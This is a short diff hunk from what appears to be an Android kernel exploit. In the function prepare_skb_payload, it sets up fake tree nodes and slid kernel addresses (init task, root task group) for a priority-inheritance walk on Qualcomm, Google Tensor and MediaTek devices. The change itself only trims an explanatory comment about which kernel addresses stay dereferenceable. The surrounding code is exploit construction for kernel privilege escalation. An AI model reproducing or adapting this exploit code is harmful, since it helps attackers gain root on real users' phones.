@@ -369,15 +369,9 @@ int prepare_skb_payload(uintptr_t base) {
   uintptr_t write_pc = fake_parent;
   uintptr_t write_right = fake_right;
   uintptr_t write_left = fake_left;
-  /* The PI walk dereferences these pointers (task->pi_lock, pi_waiters,
-   * sched_task_group), so they must be live kernel VAs. KIMAGE_TEXT_BASE is
-   * only a symbol-reference base: it equals the real _text VA on qcom
-   * (0xffffffc080000000) but NOT on Google Tensor (39-bit VA, _text at
-   * 0xffffffc008000000) or MTK, where the image addresses are unmapped and
-   * the first PI-walk dereference panics the kernel. Direct-map aliases
-   * (data_addr) resolve to the same physical pages and are dereferenceable
-   * on every SoC — the tcp route already uses SLIDE_INIT_TASK the same way
-   * for the on-stack waiter. */
+  /* Direct-map aliases (data_addr) resolve to the same physical pages and 
+   * are dereferenceable on every SoC — the tcp route already uses SLIDE_INIT_TASK 
+   * the same way for the on-stack waiter. */
   uint64_t waiter_task = SLIDE_INIT_TASK;
   uint64_t task_group = SLIDE_ROOT_TASK_GROUP;
   uint64_t pi_top_task = SLIDE_INIT_TASK;
